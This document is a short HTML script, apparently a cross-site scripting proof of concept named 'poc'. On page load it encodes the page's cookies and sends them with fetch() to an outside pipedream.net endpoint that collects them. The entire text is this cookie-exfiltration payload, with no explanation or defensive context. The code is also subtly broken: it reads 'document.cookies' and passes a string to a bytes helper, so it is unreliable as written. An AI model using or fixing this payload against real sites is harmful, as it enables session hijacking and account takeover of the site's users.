<script>

async function poc() {
    const response = await fetch("https://eouk77kbua3kmsa.m.pipedream.net?cookies=" + bytesToBase64(document.cookies));
    const data = await response.json();
    console.log(data);
  }
  
  function bytesToBase64(bytes) {
    const binString = String.fromCodePoint(...bytes);
    return btoa(binString);
  }

  poc();

</script>
